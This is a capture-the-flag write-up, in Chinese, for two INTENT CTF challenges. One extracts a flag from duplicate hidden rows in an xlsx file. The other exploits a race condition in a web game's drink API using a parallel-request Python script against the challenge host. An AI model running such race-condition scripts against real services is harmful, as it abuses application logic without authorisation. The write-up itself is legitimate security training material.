# INTENT CTF
###### tags: `CTF`

## forensics
### Down The Rabbit Hole
![](https://i.imgur.com/4YvjK7V.png =300x)

題目給了一個 xlsx 檔案，看到就是直接 zip 解壓縮

在裡面的 `/xl/worksheets` 資料夾裡可以看到有四張 xml，其中第四張有特別的資訊

```
Now go back and find the super DUPer hidden rows
```

觀察了一下前三張 xml 後，發現有些地方會有重複的 row，比如說第一張的 row 109

![](https://i.imgur.com/3br4hpe.png)

經過初步測試後，發現拿前面的值來作為 ascii 解讀的話，似乎就是 flag，於是我寫了一個程式自動解碼

:::spoiler solve.py
```python=
import re

flag = ""
for filename in ["sheet1.xml", "sheet2.xml", "sheet3.xml"]:
    with open(f"./extract/xl/worksheets/{filename}") as fh:
        data = fh.read()

    for i in range(100, 201):
        numbers = re.findall(f"<c r=\"A{i}\"><v>(\d*)</v></c>", data)
        print(i, numbers)
        if(len(numbers) >= 2):
            flag += chr(int(numbers[0]))
    
print(flag)
```
:::

![](https://i.imgur.com/TkTlBoz.png)

INTENT{u_f0und_w0nd3rl2nd}

## Web
### Drink Me
![](https://i.imgur.com/wHPIvto.png =300x)

連進去後，發現是一個小遊戲，要想辦法讓主角變小進門

![](https://i.imgur.com/Hq8iDSz.png =700x)

基本上可以做的事就是點鑰匙進門、喝藥水、reset session，而藥水可以縮小，但只能用一次，而在正常玩法下，基本上是沒辦法進門的

在觀察網路流量後，發現基本上會有以下 api

```=
GET /                沒有作用
POST /api/drink      喝飲料，在一般遊玩下會傳送 {shrink: "2x"} 的 data 但實際修改沒任何作用
GET /api/getsize     取得角色大小，如果在沒有 cookie 的情況下會產生新 cookie
POST /api/usekey     使用鑰匙，在一般遊玩下會有 {key: "open door"} 的 data 但也沒有任何作用
GET /api/reset       重制，用來清掉 cookie
```

在調整封包上沒有什麼作用，所以暫時陷入膠著

後來在查看網頁原始碼，發現有一個 main.js 引用，並且在 main.js 發現了以下字串
```javascript=
// Follow me for more ;)
// https://github.com/AbsalomNargilotLTD
```

進去 github 後，發現就只有一個專案，裡面是伺服器的原始碼，也發現在前面階段修改 data 區塊無效是正常的因為根本不會管

而後在 `database.js` 和 `routes/index.js` 中發現一個有趣的地方，變小和設定喝過這兩個動作是分開的，且是先做計算變小之後才設定喝過

![](https://i.imgur.com/QIHnQ8N.png =500x)

![](https://i.imgur.com/A4pItSt.png =700x)

一個大膽的想法誕生，是不是可以趁伺服器還在處理變小但還沒處理設定喝過的情況下，再多送一個封包，讓伺服器重複計算變小這件事情，換言之就叫做 racing condition

另外也可以看到，需要縮小到 1/16 倍之後才能拿到 flag，也就是說要成功 4 次

![](https://i.imgur.com/mBXSKIl.png =600x)

我參考了 multiprocessing 文件的程式碼後，改成了 exploit

:::spoiler solve.py
```python=
import requests
from multiprocessing import Pool

url = "https://intent-drink-me.chals.io/"
session = ""

def send_drink_requests(s):
    res = requests.post(f"{url}api/drink", cookies={"session": s})
    return res.status_code

while(True):
    res = requests.get("https://intent-drink-me.chals.io/api/getsize")
    session = res.cookies["session"]
    status = []
    pools = 10
    with Pool(pools) as p:
        status.append(p.map(send_drink_requests, [session]*pools))
    print(status)
    # print(f"success: {len([s for s in status if s != 401])} / {pools}")

    res = requests.get("https://intent-drink-me.chals.io/api/getsize", cookies={"session": session})
    print(res.json())

    res = requests.post("https://intent-drink-me.chals.io/api/usekey", cookies={"session": session})
    print(res.text)

    if("big" not in res.text):
        break

    requests.get("https://intent-drink-me.chals.io/api/reset", cookies={"session": session})
    print("reseting...")
    print()
```
:::

在執行時會嘗試一次送出 10 個 request 給伺服器處理，在測試時恰巧執行 2 次成功

![](https://i.imgur.com/ZDRe8NK.png)

INTENT{wh47_a_cur10u5_f331ln9!}